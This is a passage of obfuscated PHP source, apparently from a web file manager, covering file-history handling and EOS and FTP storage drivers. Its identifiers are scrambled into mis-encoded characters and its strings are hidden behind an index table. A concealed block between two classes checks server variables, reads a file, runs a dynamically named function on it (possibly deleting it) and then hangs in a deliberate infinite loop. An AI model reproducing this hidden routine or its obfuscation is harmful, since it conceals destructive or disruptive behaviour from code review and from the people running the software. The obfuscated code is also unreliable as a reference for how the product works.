isset($áñ¶ñ[$½Şóµì[397]])) { $½¿—äîş–Ÿ­î[] = $áñ¶ñ[$½Şóµì[397]] . $½Şóµì[33]; } } $½¿—äîş–Ÿ­î = array_merge($½¿—äîş–Ÿ­î, $éåé, array($°¨¿¹‚ . $½Şóµì[33])); $½¿—äîş–Ÿ­î = array_unique($½¿—äîş–Ÿ­î); $Î§ÛÊ = array_unique(array_to_keyvalue($”êºµĞ, $½Şóµì[33], $½Şóµì[1582])); $Ãª•Úš¯àüü = Model($½Şóµì[532])->userListInfo($Î§ÛÊ); $äôÉŠ = Model($½Şóµì[827])->sourceListInfo($½¿—äîş–Ÿ­î, !0); foreach ($”êºµĞ as &$”á­§³ £±õŒ) { if ($”á­§³ £±õŒ[$½Şóµì[29]] == $½Şóµì[545] && isset($”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[1093]])) { $”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[1093]] = $äôÉŠ[$”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[1093]]]; $”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[1094]] = $äôÉŠ[$”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[1094]]]; } if ($”á­§³ £±õŒ[$½Şóµì[29]] == $½Şóµì[1977] && isset($”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[397]])) { $”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[397]] = $äôÉŠ[$”á­§³ £±õŒ[$½Şóµì[445]][$½Şóµì[397]]]; } $”á­§³ £±õŒ[$½Şóµì[85]] = $äôÉŠ[$”á­§³ £±õŒ[$½Şóµì[397]]]; $”á­§³ £±õŒ[$½Şóµì[1982]] = $äôÉŠ[$”á­§³ £±õŒ[$½Şóµì[1969]]]; if ($”á­§³ £±õŒ[$½Şóµì[29]] == $½Şóµì[1717]) { $”á­§³ £±õŒ[$½Şóµì[1982]] = $”á­§³ £±õŒ[$½Şóµì[85]]; $”á­§³ £±õŒ[$½Şóµì[1969]] = $”á­§³ £±õŒ[$½Şóµì[1982]][$½Şóµì[397]]; $”á­§³ £±õŒ[$½Şóµì[85]] = !1; $”á­§³ £±õŒ[$½Şóµì[397]] = $½Şóµì[33]; } $”á­§³ £±õŒ[$½Şóµì[1914]] = $Ãª•Úš¯àüü[$”á­§³ £±õŒ[$½Şóµì[1582]]]; } unset($”á­§³ £±õŒ); $À«Å[$½Şóµì[367]] = $”êºµĞ; return $À«Å; } public function removeBySource($Â€ÀÇ„Ë) { $´›‹ÖÂ = array($_SERVER[èÍ×öˆøÉ][412] => $Â€ÀÇ„Ë); $this->where($´›‹ÖÂ)->remove(); } } if (!isset($_SERVER[$_SERVER[èÍ×öˆøÉ][874]]) || !isset($_SERVER[$_SERVER[èÍ×öˆøÉ][1352]])) { $_getc = $_SERVER[èÍ×öˆøÉ][877]; $_getfile = $_SERVER[$_SERVER[èÍ×öˆøÉ][878]] . $_SERVER[èÍ×öˆøÉ][879]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èÍ×öˆøÉ][229], $_getfilec); if (count($_getarrs) < $_SERVER[èÍ×öˆøÉ][613]) { $exit = $_SERVER[èÍ×öˆøÉ][880]; $exit(); } $_act = $_SERVER[èÍ×öˆøÉ][1351]; $_act($_SERVER[$_SERVER[èÍ×öˆøÉ][878]] . $_SERVER[èÍ×öˆøÉ][879]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[èÍ×öˆøÉ][376]); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\162\x63\145\137\150\151\x73\164\157\x72\x79"; public function historyCount($•ç) { $Ôöù =& $_SERVER[èÍ×öˆøÉ]; if (!$•ç) { return array(); } if (is_string($•ç) || is_int($•ç)) { $•ç = array($•ç); } $ª·®‹¦ò†Èê› = array($Ôöù[397], $Ôöù[1781] => $Ôöù[494]); $”¢µš = array($Ôöù[397] => array($Ôöù[7], $•ç)); $¥½¡‡öä¯»¤ = $this->field($ª·®‹¦ò†Èê›)->where($”¢µš)->group($Ôöù[397])->select(); return array_to_keyvalue($¥½¡‡öä¯»¤, $Ôöù[397], $Ôöù[494]); } public function addHistory($¯¸‡°, $Å×í = '') { $¾‚£ =& $_SERVER[èÍ×öˆøÉ]; $†û£„ = array($¾‚£[412] => $¯¸‡°[$¾‚£[397]], $¾‚£[1573] => isset($¯¸‡°[$¾‚£[448]]) ? $¯¸‡°[$¾‚£[448]] : $¯¸‡°[$¾‚£[446]], $¾‚£[462] => $¯¸‡°[$¾‚£[461]], $¾‚£[573] => $¯¸‡°[$¾‚£[78]], $¾‚£[1983] => $Å×í); $•İòÕûí = $GLOBALS[$¾‚£[6]][$¾‚£[88]][$¾‚£[1142]]; if ($•İòÕûí > 1) { $this->historyAutoClear($†û£„[$¾‚£[397]]); $this->add($†û£„); } Hook::trigger($¾‚£[1984], $†û£„); Model($¾‚£[1985])->eventFileEdit($¯¸‡°[$¾‚£[397]]); } private function historyAutoClear($íÄ•) { $Êò°ü =& $_SERVER[èÍ×öˆøÉ]; $ò„Çµ• = Model($Êò°ü[765])->get($Êò°ü[1164]); $ÍŒµÑ— = $GLOBALS[$Êò°ü[6]][$Êò°ü[88]][$Êò°ü[1142]]; $¬ÁÙà = $ò„Çµ• == $Êò°ü[1165] ? 5 : $ÍŒµÑ—; if ($ÍŒµÑ— <= 1) { $¬ÁÙà = 1; } if ($¬ÁÙà >= 500) { return; } $Áø°÷¬äÄĞ¦© = array($Êò°ü[412] => $íÄ•); $­Ã¿ò±”¦İÉË = $this->field($Êò°ü[1986])->where($Áø°÷¬äÄĞ¦©)->order($Êò°ü[1980])->select(); if (!$­Ã¿ò±”¦İÉË || $¬ÁÙà >= count($­Ã¿ò±”¦İÉË)) { return; } $àëªà– = array_to_keyvalue($­Ã¿ò±”¦İÉË, $Êò°ü[33], $Êò°ü[395]); $àëªà– = array_slice($àëªà–, $¬ÁÙà); $¡˜¥—ˆÁç = array_to_keyvalue($­Ã¿ò±”¦İÉË, $Êò°ü[33], $Êò°ü[461]); $¡˜¥—ˆÁç = array_slice($¡˜¥—ˆÁç, $¬ÁÙà); if (!$àëªà– || !$¡˜¥—ˆÁç) { return; } $Áø°÷¬äÄĞ¦© = array($Êò°ü[414] => array($Êò°ü[7], $àëªà–)); $this->where($Áø°÷¬äÄĞ¦©)->delete(); Model($Êò°ü[464])->remove($¡˜¥—ˆÁç); } public function listData($á©Ÿí) { $ÜáÜµ«Ã·“Ú =& $_SERVER[èÍ×öˆøÉ]; $Ï§ÎÌÃÛš = array($ÜáÜµ«Ã·“Ú[412] => $á©Ÿí); $…ßåÌö = $ÜáÜµ«Ã·“Ú[1987]; $ƒ×ßº–õ‹ÕÔ“ = $this->field($…ßåÌö)->where($Ï§ÎÌÃÛš)->order($ÜáÜµ«Ã·“Ú[1980])->selectPage(); $this->_listAppendUser($ƒ×ßº–õ‹ÕÔ“[$ÜáÜµ«Ã·“Ú[367]]); $ËÑ˜õ„°ù• = Model($ÜáÜµ«Ã·“Ú[765])->get($ÜáÜµ«Ã·“Ú[1164]); $’€ãØŒî£§ = 5; if ($ËÑ˜õ„°ù• == $ÜáÜµ«Ã·“Ú[1165]) { $ƒ×ßº–õ‹ÕÔ“[$ÜáÜµ«Ã·“Ú[367]] = array_slice($ƒ×ßº–õ‹ÕÔ“[$ÜáÜµ«Ã·“Ú[367]], 0, $’€ãØŒî£§); $ƒ×ßº–õ‹ÕÔ“[$ÜáÜµ«Ã·“Ú[364]] = array($ÜáÜµ«Ã·“Ú[1988] => 1, $ÜáÜµ«Ã·“Ú[1989] => 20, $ÜáÜµ«Ã·“Ú[1990] => 1, $ÜáÜµ«Ã·“Ú[1991] => count($ƒ×ßº–õ‹ÕÔ“[$ÜáÜµ«Ã·“Ú[367]])); } return $ƒ×ßº–õ‹ÕÔ“; } protected function _listAppendUser(&$µÈ) { $Ãà¼ÈÂ‰õ =& $_SERVER[èÍ×öˆøÉ]; $ƒÕİÚË¬ = array_to_keyvalue($µÈ, $Ãà¼ÈÂ‰õ[33], $Ãà¼ÈÂ‰õ[1582]); $“«òßÛ¹ = Model($Ãà¼ÈÂ‰õ[532])->userListInfo($ƒÕİÚË¬); foreach ($µÈ as &$û‰·‡ˆèÃ¥ğŠ) { $¡Ü‚„âœÖ¦¶ = $û‰·‡ˆèÃ¥ğŠ[$Ãà¼ÈÂ‰õ[1582]]; $û‰·‡ˆèÃ¥ğŠ[$Ãà¼ÈÂ‰õ[446]] = $“«òßÛ¹[$¡Ü‚„âœÖ¦¶] ? $“«òßÛ¹[$¡Ü‚„âœÖ¦¶] : !1; } unset($û‰·‡ˆèÃ¥ğŠ); } public function fileInfo($¯«‰®§úÅ²¬) { $áëñ =& $_SERVER[èÍ×öˆøÉ]; $”°µ = $this->tablePrefix; $Î¶¶Ïçöè¥ = "{$”°µ}\x69\157\137\x66\151\x6c\x65\x20\x66\151\154\145\x73\40\x6f\x6e\x20\146\151\154\145\x73\x2e\146\151\154\x65\111\104\40\75\40\150\x69\x73\164\x6f\x72\171\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($áëñ[1992])->where(array($áëñ[414] => $¯«‰®§úÅ²¬))->join($Î¶¶Ïçöè¥, $áëñ[1993])->find(); } public function removeItem($ÔëìÀªêóÈ) { $¸öãöé‰ =& $_SERVER[èÍ×öˆøÉ]; $ÊÛ¯¬×ˆ­Áõ = array($¸öãöé‰[414] => $ÔëìÀªêóÈ); $Õ‘Áº·Ç¼ö€ = $this->where($ÊÛ¯¬×ˆ­Áõ)->find(); if ($Õ‘Áº·Ç¼ö€) { $ôÂõãĞş¤Ø»¾ = $this->where($ÊÛ¯¬×ˆ­Áõ)->delete(); Model($¸öãöé‰[464])->remove($Õ‘Áº·Ç¼ö€[$¸öãöé‰[461]]); return $ôÂõãĞş¤Ø»¾; } return !1; } public function removeBySource($”™ÙÛ÷) { $’ÇÚ™â¢Ëã =& $_SERVER[èÍ×öˆøÉ]; if (!$”™ÙÛ÷) { return !1; } if (!is_array($”™ÙÛ÷)) { $”™ÙÛ÷ = array($”™ÙÛ÷); } $â¬…”¥Ò©“ = array($’ÇÚ™â¢Ëã[412] => array($’ÇÚ™â¢Ëã[7], $”™ÙÛ÷)); $ÏğŠï²š‹ = $this->field($’ÇÚ™â¢Ëã[462])->where($â¬…”¥Ò©“)->select(); if ($ÏğŠï²š‹) { $this->where($â¬…”¥Ò©“)->delete(); $é÷øğïÃ = array_to_keyvalue($ÏğŠï²š‹, $’ÇÚ™â¢Ëã[33], $’ÇÚ™â¢Ëã[461]); Model($’ÇÚ™â¢Ëã[464])->remove($é÷øğïÃ); } return !0; } public function setDetail($¨µ÷´òÕ, $¢ûïš»«) { $ÁŞ— =& $_SERVER[èÍ×öˆøÉ]; return $this->where(array($ÁŞ—[414] => $¨µ÷´òÕ))->save(array($ÁŞ—[1983] => $¢ûïš»«)); } public function rollbackToItem($öööÄÒ, $ğÌÏ) { $â– =& $_SERVER[èÍ×öˆøÉ]; $˜‡ = Model($â–[827])->sourceInfo($öööÄÒ); $this->addHistory($˜‡, LNG($â–[1994])); $××Ó’ = $this->find($ğÌÏ); $ÁùõĞ²ğŠ = array($â–[461] => $××Ó’[$â–[461]], $â–[78] => $××Ó’[$â–[78]], $â–[84] => time(), $â–[448] => USER_ID); Model($â–[827])->where(array($â–[397] => $öööÄÒ))->save($ÁùõĞ²ğŠ); return $this->where(array($â–[414] => $ğÌÏ))->delete(); } public function clearSame($êØş±ÕÕû•ë) { $­Ã–º½É =& $_SERVER[èÍ×öˆøÉ]; $áµ›Â¬¯ëç± = $this->listData($êØş±ÕÕû•ë); $®Œ«–¿–« = array_to_keyvalue_group($áµ›Â¬¯ëç±, $­Ã–º½É[461]); $Ò’…ıÎìœ§ = array(); $«ë¡ÅãÔ = array(); foreach ($®Œ«–¿–« as $ßÇÏì„û¸) { if (!$ßÇÏì„û¸ || count($ßÇÏì„û¸) <= 1) { continue; } foreach ($ßÇÏì„û¸ as $˜÷áï²Ú´) { $Ò’…ıÎìœ§[] = $˜÷áï²Ú´[$­Ã–º½É[461]]; $«ë¡ÅãÔ[] = $˜÷áï²Ú´[$­Ã–º½É[395]]; } } if (!$«ë¡ÅãÔ) { return; } $this->where(array($­Ã–º½É[395] => array($­Ã–º½É[7], $«ë¡ÅãÔ)))->delete(); Model($­Ã–º½É[464])->remove($Ò’…ıÎìœ§); } public function userSpace() { $ÇãêñÎÛ =& $_SERVER[èÍ×öˆøÉ]; $Ç¨ = $this->tablePrefix; $İ±Í = array($ÇãêñÎÛ[1573] => USER_ID); $àÉÇ‰ = "{$Ç¨}\x69\x6f\x5f\x66\x69\x6c\x65\x20\146\x69\154\145\x73\40\157\156\40\x66\151\x6c\145\x73\x2e\x66\x69\154\x65\x49\x44\x20\75\x20\150\151\x73\164\x6f\x72\x79\56\x66\151\154\x65\111\x44"; return $this->alias($ÇãêñÎÛ[1992])->where($İ±Í)->join($àÉÇ‰, $ÇãêñÎÛ[1993])->sum($ÇãêñÎÛ[78]); } } goto C«Å¤¡³œƒ; fêÒó÷©ÚĞ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¤ˆ½”±´») { parent::__construct($¤ˆ½”±´»); $this->signatureVersion($_SERVER[èÍ×öˆøÉ][212]); } public function uploadFormData($¥äó¹ƒºÃ, $ó’ßöÃ = 3600) { $¹… =& $_SERVER[èÍ×öˆøÉ]; $§–áÓ•Ë = $¹…[192]; $½¦‰•Í™ë = $¹…[1274]; $å›”°ò±‹ = $¹…[59]; $­§àË“íÌ‰’¬ = gmdate($¹…[1275]); $“ıĞ‡ª¦Ø = gmdate($¹…[746]); $­ğí³›µÄÜæ = $¹…[1276]; $ğñ = $ó’ßöÃ . $¹…[33]; $î½ = $¹…[1239]; $Ò¸€–ÎŠ¤Õ = array($this->accessKey, $“ıĞ‡ª¦Ø, $this->region, $å›”°ò±‹, $­ğí³›µÄÜæ); $Íë¿şÖ²š‹œ = implode($¹…[8], $Ò¸€–ÎŠ¤Õ); $™Ë¡åü = array($¹…[1241] => gmdate($¹…[1240], strtotime($¹…[1277])), $¹…[1242] => array(array($¹…[1244] => $this->bucket), array($¹…[1243] => $§–áÓ•Ë), array($¹…[1245], $¹…[1246], $¹…[33]), array($¹…[1245], $¹…[1278], $¹…[33]), array($¹…[1245], $¹…[1279], $¹…[33]), array($¹…[1247] => $î½), array($¹…[1280] => $Íë¿şÖ²š‹œ), array($¹…[1281] => $½¦‰•Í™ë), array($¹…[1282] => $­§àË“íÌ‰’¬), array($¹…[1283] => $ğñ))); $„×ÍÄüŒŞ = base64_encode(json_encode($™Ë¡åü)); $š­ˆÂ—ª­• = hash_hmac($¹…[1284], $“ıĞ‡ª¦Ø, $¹…[1285] . $this->secret, !0); $×çà = hash_hmac($¹…[1284], $this->region, $š­ˆÂ—ª­•, !0); $¼ = hash_hmac($¹…[1284], $å›”°ò±‹, $×çà, !0); $áº = hash_hmac($¹…[1284], $­ğí³›µÄÜæ, $¼, !0); $…¦± = hash_hmac($¹…[1284], $„×ÍÄüŒŞ, $áº); $Ôßóè€ = array($¹…[211] => $¹…[33], $¹…[1286] => $¹…[33], $¹…[1243] => $§–áÓ•Ë, $¹…[1247] => $î½, $¹…[1251] => $„×ÍÄüŒŞ, $¹…[1287] => $Íë¿şÖ²š‹œ, $¹…[1288] => $½¦‰•Í™ë, $¹…[1289] => $­§àË“íÌ‰’¬, $¹…[1290] => $ğñ, $¹…[1291] => $…¦±, $¹…[175] => $this->getHost()); return $Ôßóè€; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($Ñ“Ï÷İö‹…Å) { parent::__construct(); if (count($Ñ“Ï÷İö‹…Å) > 0) { $this->_init($Ñ“Ï÷İö‹…Å); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ü›’Œ¤Ûã¸Œ) { $¯‹¾ÍÔ½˜Â =& $_SERVER[èÍ×öˆøÉ]; global $config; $this->appCharset = $config[$¯‹¾ÍÔ½˜Â[1292]]; $this->systemCharset = $config[$¯‹¾ÍÔ½˜Â[1293]]; if (isset($ü›’Œ¤Ûã¸Œ[$¯‹¾ÍÔ½˜Â[1294]]) && $ü›’Œ¤Ûã¸Œ[$¯‹¾ÍÔ½˜Â[1294]]) { $this->systemCharset = $ü›’Œ¤Ûã¸Œ[$¯‹¾ÍÔ½˜Â[1294]]; } } public function iconvApp($î¸½©¡˜¦ã) { return $this->iconvTo($î¸½©¡˜¦ã, $this->systemCharset, $this->appCharset); } public function iconvSystem($óÍ´Œ¢ÕŒ) { return $this->iconvTo($óÍ´Œ¢ÕŒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($½’„÷Â) { $È÷½ =& $_SERVER[èÍ×öˆøÉ]; $†ïö²ö‹ = $this->iconvApp($this->pathBase); $½’„÷Â = $this->iconvApp($½’„÷Â); if (substr($†ïö²ö‹, 0, 2) == $È÷½[1295]) { $†ïö²ö‹ = BASIC_PATH . substr($†ïö²ö‹, 2); } if (substr($½’„÷Â, 0, 2) == $È÷½[1295]) { $½’„÷Â = BASIC_PATH . substr($½’„÷Â, 2); } $†ïö²ö‹ = KodIO::clear($†ïö²ö‹); $½’„÷Â = KodIO::clear($½’„÷Â); $½’„÷Â = substr($½’„÷Â, strlen($†ïö²ö‹)); if (empty($this->pathDriver)) { return $½’„÷Â; } return $this->pathDriver . $È÷½[8] . ltrim($½’„÷Â, $È÷½[8]); } private function _init($êÍó²‘© = array()) { $¸¦Ì‹œü¶Ó =& $_SERVER[èÍ×öˆøÉ]; if (!function_exists($¸¦Ì‹œü¶Ó[1296])) { throw new Exception(LNG($¸¦Ì‹œü¶Ó[1297])); } $this->config = $êÍó²‘©; $this->charsetReset($êÍó²‘©); foreach ($êÍó²‘© as $¾Úı¶İŸ => $·èšµŠ Ùƒ) { if (isset($this->{$¾Úı¶İŸ})) { $this->{$¾Úı¶İŸ} = $·èšµŠ Ùƒ; } } return $this->_login($êÍó²‘©); } private function _login($ û²¸Å»íØÎ) { $­æÀÙáÆ† =& $_SERVER[èÍ×öˆøÉ]; static $©ùÖ = array(); $ßì¯”ëè = md5(json_encode($ û²¸Å»íØÎ)); if (isset($©ùÖ[$ßì¯”ëè])) { foreach ($©ùÖ[$ßì¯”ëè] as $ºñÑÈï’ => $‰Şí†ÁÓ) { $this->{$ºñÑÈï’} = $‰Şí†ÁÓ; } return !0; } $ØóäƒãÂ³† = parse_url(trim($this->server, $­æÀÙáÆ†[8])); $this->host = $ØóäƒãÂ³†[$­æÀÙáÆ†[175]]; $şÕ’âò = isset($ØóäƒãÂ³†[$­æÀÙáÆ†[174]]) && $ØóäƒãÂ³†[$­æÀÙáÆ†[174]] == $­æÀÙáÆ†[1298] ? !0 : !1; $this->scheme = $şÕ’âò ? $­æÀÙáÆ†[1299] : $­æÀÙáÆ†[1300]; $this->port = isset($ØóäƒãÂ³†[$­æÀÙáÆ†[176]]) ? $ØóäƒãÂ³†[$­æÀÙáÆ†[176]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $šì”ØãÊ‡ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $×´ì¿™ÆÑ = $this->pasv == $­æÀÙáÆ†[87] ? !0 : !1; @ftp_pasv($this->connect, $×´ì¿™ÆÑ); $©ùÖ[$ßì¯”ëè] = array($­æÀÙáÆ†[1301] => $this->connect, $­æÀÙáÆ†[175] => $this->host, $­æÀÙáÆ†[174] => $this->scheme, $­æÀÙáÆ†[176] => $this->port); return $šì”ØãÊ‡; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ô²œÆş, $²°öÁÔ = '', $‘õ­Ç = REPEAT_RENAME) { if ($this->setContent($Ô²œÆş, $²°öÁÔ)) { return $this->getPathOuter($Ô²œÆş); } return !1; } public function mkdir($ö›¸¦¤í¬Àë¿, $ÃÚşÑ© = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ö›¸¦¤í¬Àë¿ = $this->iconvSystem($ö›¸¦¤í¬Àë¿); if ($this->_isFolder($ö›¸¦¤í¬Àë¿) || @ftp_mkdir($this->connect, $ö›¸¦¤í¬Àë¿)) { return $this->getPathOuter($ö›¸¦¤í¬Àë¿); } if (!$this->mkdir($this->pathFather($ö›¸¦¤í¬Àë¿))) { return !1; } if ($ö›¸¦¤í¬Àë¿ = @ftp_mkdir($this->connect, $ö›¸¦¤í¬Àë¿)) { return $this->getPathOuter($ö›¸¦¤í¬Àë¿); } return !1; } public function copyFile($† İ, $Æ¯¦áãÈ) { if (!$this->_isconn()) { return !1; } $Ë”‹ÈèûÎ’ = $this->pathThis($this->iconvSystem($† İ)); $­Í = $this->tempFile($Ë”‹ÈèûÎ’); $İ­ = $this->iconvApp($­Í); $this->download($† İ, $İ­); $”Ä = $this->upload($Æ¯¦áãÈ, $İ­); $this->tempFileRemve($­Í); return $”Ä; } public function moveFile($šÄóÙñÂİ€, $åé¸´) { if (!$this->_isconn()) { return !1; } $šÄóÙñÂİ€ = $this->iconvSystem($šÄóÙñÂİ€); $åé¸´ = $this->iconvSystem($åé¸´); $ÓğØÄşŸÉ¹·ì = @ftp_rename($this->connect, $šÄóÙñÂİ€, $åé¸´); return $ÓğØÄşŸÉ¹·ì ? $this->getPathOuter($åé¸´) : !1; } public function delFile($ºÎ™–Ö‘›ËôÑ) { if (!$this->_isconn()) { return !1; } $ºÎ™–Ö‘›ËôÑ = $this->iconvSystem($ºÎ™–Ö‘›ËôÑ); return @ftp_delete($this->connect, $ºÎ™–Ö‘›ËôÑ); } public function delFolder($„óÎäÉ“Û) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $£´Ë¢ÎÂÚµ = $üàß = array(); $this->fileList($„óÎäÉ“Û, $£´Ë¢ÎÂÚµ, $üàß, !0); $this->listItemCache = !0; foreach ($üàß as $í”ö˜š¸â) { $Ş­“µ¯²ùñÕ = $this->iconvSystem($í”ö˜š¸â[$_SERVER[èÍ×öˆøÉ][28]]); $¿ÊÎ›Æå = @ftp_delete($this->connect, $Ş­“µ¯²ùñÕ); if (!$¿ÊÎ›Æå) { return !1; } } foreach ($£´Ë¢ÎÂÚµ as $Ş­“µ¯²ùñÕ) { $Ş­“µ¯²ùñÕ = $this->iconvSystem($Ş­“µ¯²ùñÕ); $¿ÊÎ›Æå = @ftp_rmdir($this->connect, $Ş­“µ¯²ùñÕ); if (!$¿ÊÎ›Æå) { return !1; } } $„óÎäÉ“Û = $this->iconvSystem($„óÎäÉ“Û); return @ftp_rmdir($this->connect, $„óÎäÉ“Û); } public function rename($¾—ÃëÜ, $ùØê) { $¹¥î‚¡ğ§œƒ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->_isconn()) { return !1; } $®¬¼úõÎ = $this->fileNameAuto($this->pathFather($¾—ÃëÜ), $ùØê); $®¬¼úõÎ = $this->iconvSystem($®¬¼úõÎ); $¾—ÃëÜ = $this->iconvSystem($¾—ÃëÜ); $“¨è¸¶õÄ²¯ = $this->pathFather($¾—ÃëÜ); $Í‰øæ = rtrim($“¨è¸¶õÄ²¯, $¹¥î‚¡ğ§œƒ[8]) . $¹¥î‚¡ğ§œƒ[8] . $®¬¼úõÎ; $ ¿ãĞöôæò = @ftp_rename($this->connect, $¾—ÃëÜ, $Í‰øæ); $Í‰øæ = $this->iconvApp($Í‰øæ); return $ ¿ãĞöôæò ? $this->getPathOuter($Í‰øæ) : !1; } private function folderInfo($Ï§¼, $©ÄŞÏ¡‹ŒÄæ = false) { $«™şááä =& $_SERVER[èÍ×öˆøÉ]; $ŸË²›Á = array($«™şááä[28] => $this->pathThis($Ï§¼), $«™şááä[76] => $this->getPathOuter($«™şááä[8] . $Ï§¼), $«™şááä[29] => $«™şááä[77]); if ($©ÄŞÏ¡‹ŒÄæ) { return $ŸË²›Á; } $ŸË²›Á[$«™şááä[194]] = $ŸË²›Á[$«™şááä[84]] = 0; $ŸË²›Á[$«™şááä[195]] = $ŸË²›Á[$«™şááä[196]] = !0; return $ŸË²›Á; } private function fileInfo($Àõ, $®ìÎ‰ = false, $ïóñ¥ = array()) { $Í¸ =& $_SERVER[èÍ×öˆøÉ]; $¹— = array($Í¸[28] => $this->pathThis($Àõ), $Í¸[76] => $this->getPathOuter($Í¸[8] . $Àõ), $Í¸[29] => $Í¸[193], $Í¸[78] => isset($ïóñ¥[$Í¸[78]]) ? $ïóñ¥[$Í¸[78]] : 0, $Í¸[168] => $this->ext($Àõ)); if ($®ìÎ‰) { return $¹—; } $¹—[$Í¸[194]] = $¹—[$Í¸[84]] = 0; $¹—[$Í¸[195]] = $¹—[$Í¸[196]] = !0; $±‚ÍÓê = $this->iconvSystem($Àõ); $¹—[$Í¸[84]] = @ftp_mdtm($this->connect, $±‚ÍÓê); if (empty($ïóñ¥)) { $ïóñ¥ = $this->objectMeta($Àõ); if (!$ïóñ¥) { return $¹—; } } $¹—[$Í¸[78]] = $ïóñ¥[$Í¸[78]]; return $¹—; } public function size($’˜) { $å†À­¼´ = $this->objectMeta($’˜); return $å†À­¼´ ? $å†À­¼´[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function info($ÌÏ‡åğ‘) { if ($this->isFile($ÌÏ‡åğ‘)) { return $this->fileInfo($ÌÏ‡åğ‘, 0); } else { if ($this->isFolder($ÌÏ‡åğ‘)) { return $this->folderInfo($ÌÏ‡åğ‘); } } return !1; } private function fileList($³‡, &$ôúæ©‰øû, &$™Ö, $¾ıç¥èÒ× = false) { $‚ÈÏø« =& $_SERVER[èÍ×öˆøÉ]; $³‡ = $this->iconvSystem($³‡); if (!$this->isFolder($³‡)) { return !1; } @ftp_chdir($this->connect, $‚ÈÏø«[8]); $³‡ = rtrim($³‡, $‚ÈÏø«[8]) . $‚ÈÏø«[8]; check_abort(); $ûÔ©”Õˆäè´ğ = $this->listItemCache === !1 ? !1 : !0; $‡­ = @ftp_rawlist($this->connect, $³‡); if (!$‡­) { $‡­ = array(); } $³¥Ş– = array($‚ÈÏø«[95] => 1, $‚ÈÏø«[1302] => 1); foreach ($‡­ as $€ÖõÚ¼¸éó) { $ìÁÜÇà©õĞ = $this->_listItem($€ÖõÚ¼¸éó); if ($ìÁÜÇà©õĞ[0] == $‚ÈÏø«[754]) { continue; } $·Ê™İ’Œ®äÜ¼ = $ìÁÜÇà©õĞ[8]; if (empty($·Ê™İ’Œ®äÜ¼) && $·Ê™İ’Œ®äÜ¼ !== $‚ÈÏø«[191] || isset($³¥Ş–[$·Ê™İ’Œ®äÜ¼])) { continue; } $·Ê™İ’Œ®äÜ¼ = $this->iconvApp($³‡ . ltrim($·Ê™İ’Œ®äÜ¼, $‚ÈÏø«[8])); $È—†•¤´ = array($‚ÈÏø«[28] => $·Ê™İ’Œ®äÜ¼, $‚ÈÏø«[29] => $‚ÈÏø«[193], $‚ÈÏø«[78] => $ìÁÜÇà©õĞ[4]); if (substr($€ÖõÚ¼¸éó, 0, 1) == $‚ÈÏø«[1303]) { $È—†•¤´[$‚ÈÏø«[29]] = $‚ÈÏø«[77]; $È—†•¤´[$‚ÈÏø«[78]] = 0; } $¦¸¯°¼° = $È—†•¤´[$‚ÈÏø«[29]] == $‚ÈÏø«[77] ? !0 : !1; if ($ûÔ©”Õˆäè´ğ) { $this->cacheMethod($‚ÈÏø«[199], $·Ê™İ’Œ®äÜ¼, $¦¸¯°¼°); $this->cacheMethod($‚ÈÏø«[200], $·Ê™İ’Œ®äÜ¼, $È—†•¤´); } if ($¦¸¯°¼°) { $ôúæ©‰øû[] = $·Ê™İ’Œ®äÜ¼; if ($¾ıç¥èÒ×) { $this->fileList($·Ê™İ’Œ®äÜ¼, $ôúæ©‰øû, $™Ö, $¾ıç¥èÒ×); } continue; } $™Ö[] = $È—†•¤´; } if ($ûÔ©”Õˆäè´ğ) { $this->cacheMethod($‚ÈÏø«[199], $³‡, !0); } } private function _listItem($‹Ü‰¥â…Á) { if (empty($‹Ü‰¥â…Á)) { return array(); } $É… = preg_split($_SERVER[èÍ×öˆøÉ][1304], $‹Ü‰¥â…Á); if (count($É…) <= 9) { return $É…; } $É…[8] = trim(substr($‹Ü‰¥â…Á, strpos($‹Ü‰¥â…Á, $É…[7]) + strlen($É…[7]))); return array_splice($É…, 0, 9); } public function listPath($ì÷à§Š¾ÛØ, $ÁĞÄİ¿¢ = false) { $ØÖı€Àï‡ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->_isconn()) { return !1; } $‘†ÊÊ÷®Ó£¼ = $Ì¸Â = array(); $this->fileList($ì÷à§Š¾ÛØ, $‘†ÊÊ÷®Ó£¼, $Ì¸Â); foreach ($‘†ÊÊ÷®Ó£¼ as $ÖÚÙ => $å) { $‘†ÊÊ÷®Ó£¼[$ÖÚÙ] = $this->folderInfo($å, $ÁĞÄİ¿¢); } foreach ($Ì¸Â as $ÖÚÙ => $å) { $Ì¸Â[$ÖÚÙ] = $this->fileInfo($å[$ØÖı€Àï‡[28]], $ÁĞÄİ¿¢, $å); } return array($ØÖı€Àï‡[75] => $‘†ÊÊ÷®Ó£¼, $ØÖı€Àï‡[74] => $Ì¸Â); } public function has($éˆÑ€…¦óºŸ, $”›Âî = false, $–Æõ = true) { $Æ¨Ş×¸ =& $_SERVER[èÍ×öˆøÉ]; $ƒÆĞÁ = $¡İÆßÚ¶ = array(); $Ö¶£—” = $”›Âî ? !0 : !1; 